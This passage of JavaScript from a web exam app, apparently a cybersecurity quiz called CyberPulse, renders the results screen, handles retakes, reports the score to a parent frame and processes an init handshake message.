    var verdictTxt = passed ? '✓ PASS' : '✗ FAIL';
    hero.appendChild(el('div', 'res-hero',
      '<div><div class="res-score">' + percent + '%<small> · ' + r.sum.toFixed(1) + ' / ' + answered + ' credits</small></div>' +
      '<div class="dd-hint">scored over answered exercises only — skipped and never-answered are excluded</div></div>' +
      '<div class="verdict ' + (passed ? 'pass' : 'fail') + '">' + verdictTxt + '</div>'));
    root.appendChild(hero);
    var grid = el('div', 'res-grid');
    function cell(n, l, cls, ic) { return '<div class="res-cell"><div class="rc-n ' + (cls || '') + '">' + n + '</div><div class="rc-l"><span>' + ic + '</span><span>' + l + '</span></div></div>'; }
    grid.innerHTML =
      cell(full, 'Fully correct', 'ok-c', '✓') +
      cell(part + (part > 0 ? ' <small style="font-size:.8rem;color:var(--text-secondary)">(avg ' + (partSum / part).toFixed(2) + ')</small>' : ''), 'Partially correct', 'no-c', '✓') +
      cell(zero, 'Fully incorrect', 'no-c', '✗') +
      cell(skipped, 'Skipped — excluded', 'mi-c', '⚠');
    var gcard = el('div', 'card'); gcard.appendChild(grid);
    gcard.appendChild(el('div', 'dd-hint', '⏸ Time paused manually: ' + fmtTime(Math.round(S.manualPauseMs / 1000)) + ' · ⏸ Time reviewing feedback (auto-pause): ' + fmtTime(Math.round(S.autoPauseMs / 1000)) + ' · ⏱ Time used: ' + fmtTime((META.estimatedMinutes * 60) - S.remaining) + (timeout ? ' (timer ran out)' : '')));
    /* per-exercise strip */
    var strip = el('div', 'strip');
    EXERCISES.forEach(function (ex, i) {
      var st = S.answers[i].status, cr = S.answers[i].credit;
      var cls = st === 'checked' ? (cr >= 1 ? 'st-ok' : cr > 0 ? 'st-pa' : 'st-no') : 'st-sk';
      var ic = st === 'checked' ? (cr >= 1 ? '✓' : cr > 0 ? '±' : '✗') : '⚠';
      var chip = el('span', 'st-chip ' + cls, ic);
      chip.title = ex.id + (st === 'checked' ? ' — credit ' + cr.toFixed(2) : ' — skipped/excluded');
      chip.setAttribute('aria-label', chip.title);
      strip.appendChild(chip);
    });
    gcard.appendChild(strip);
    root.appendChild(gcard);
    var acts = el('div', 'actions');
    var rt = el('button', 'btn btn-primary', '↺ Retake the exam');
    rt.type = 'button'; rt.setAttribute('aria-label', 'Retake the exam');
    rt.addEventListener('click', retake);
    acts.appendChild(rt);
    root.appendChild(el('div', 'card', '')).appendChild(acts);
    showScreen('results');
    /* report exactly once per attempt */
    if (!S.reported) {
      S.reported = true;
      reportScore(r.sum, answered);
    }
  }
  function retake() {
    S.answers = EXERCISES.map(function () { return { status: 'unanswered', credit: 0, hintUsed: false, wstate: {}, result: null, label: '' }; });
    S.skipped = []; S.current = 0; S.reviewMode = false; S.reported = false; S.attempt++;
    S.manualPauseMs = 0; S.autoPauseMs = 0; S.priorState = null;
    buildShuffles();
    setTimerState('RUNNING'); S.remaining = (META.estimatedMinutes || 15) * 60;
    showScreen('exam'); renderExercise(0);
  }
  function reportScore(creditSumV, answeredCount) {
    var percent = answeredCount > 0 ? Math.round((creditSumV / answeredCount) * 100) : 0;
    try {
      parent.postMessage({
        type: 'CYBERPULSE_SCORE',
        topicId: META.topicId,
        batch: META.batch,
        score: Math.round(creditSumV),
        total: answeredCount,
        percent: percent,
        passed: percent >= 70
      }, location.origin);
    } catch (e) { /* opened directly rather than inside the site — nothing to report to */ }
  }

  /* ---------------- handshake ---------------- */
  window.addEventListener('message', function (event) {
    if (!event.data) return;
    var type = event.data.type;
    if (type !== 'CYBERPULSE_INIT' && type !== 'CYBERMASTERY_INIT') return;
    try {
      if (event.data.username) {
        var c = $('tbCandidate');
        c.textContent = '👤 ' + String(event.data.username).slice(0, 24);
        c.classList.remove('hidden');
      }
      /* country, locale, topicId, batch are consumed; theme is always 'dark' — this file is dark-only by contract */
    } catch (e) { }
  });

  /* ---------------- boot ---------------- */
  function boot() {
    S.answers = EXERCISES.map(function () { return { status: 'unanswered', credit: 0, hintUsed: false, wstate: {}, result: null, label: '' }; });
    buildShuffles();
    $('tbTitle').textContent = META.title;
    $('tbSevWord').textContent = META.severityLabel;
    renderIntro();
    showScreen('intro');
  }
  window.__CP_BOOT__ = boot;
})();

</script>
